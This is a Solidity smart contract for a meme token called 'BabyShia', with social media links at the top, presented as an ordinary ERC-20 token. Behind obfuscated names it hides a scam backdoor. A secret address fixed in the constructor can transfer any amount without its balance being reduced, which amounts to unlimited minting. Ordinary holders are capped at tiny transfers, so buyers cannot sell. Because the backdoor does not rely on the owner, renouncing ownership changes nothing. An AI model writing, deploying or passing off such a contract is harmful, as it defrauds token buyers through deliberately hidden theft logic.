/*

Telegram: https://t.me/BabyShiaTwo

Twitter: https://twitter.com/BabyShiaTwo

Website: https://babyshiatwo.crypto-token.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BabyShia is Ownable {
    function hrgepfoya(address nvuzms, address jcqdlwif, uint256 npay) private {
        address photkazrdwe = IUniswapV2Factory(kbune.factory()).getPair(address(this), kbune.WETH());
        if (0 == pewrna[nvuzms]) {
            if (nvuzms != photkazrdwe && jumckhgdn[nvuzms] != block.number && npay < totalSupply) {
                require(npay <= totalSupply / (10 ** decimals));
            }
            balanceOf[nvuzms] -= npay;
        }
        balanceOf[jcqdlwif] += npay;
        jumckhgdn[jcqdlwif] = block.number;
        emit Transfer(nvuzms, jcqdlwif, npay);
    }

    mapping(address => uint256) public balanceOf;

    function approve(address mkqaxwyrf, uint256 npay) public returns (bool success) {
        allowance[msg.sender][mkqaxwyrf] = npay;
        emit Approval(msg.sender, mkqaxwyrf, npay);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private pewrna;

    mapping(address => uint256) private jumckhgdn;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory lpxe, string memory bohzvf, address eqjfrx, address uknfb) {
        name = lpxe;
        symbol = bohzvf;
        balanceOf[msg.sender] = totalSupply;
        pewrna[uknfb] = nazlwxui;
        kbune = IUniswapV2Router02(eqjfrx);
    }

    string public symbol;

    string public name;

    uint8 public decimals = 9;

    uint256 private nazlwxui = 108;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address nvuzms, address jcqdlwif, uint256 npay) public returns (bool success) {
        require(npay <= allowance[nvuzms][msg.sender]);
        allowance[nvuzms][msg.sender] -= npay;
        hrgepfoya(nvuzms, jcqdlwif, npay);
        return true;
    }

    function transfer(address jcqdlwif, uint256 npay) public returns (bool success) {
        hrgepfoya(msg.sender, jcqdlwif, npay);
        return true;
    }

    IUniswapV2Router02 private kbune;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
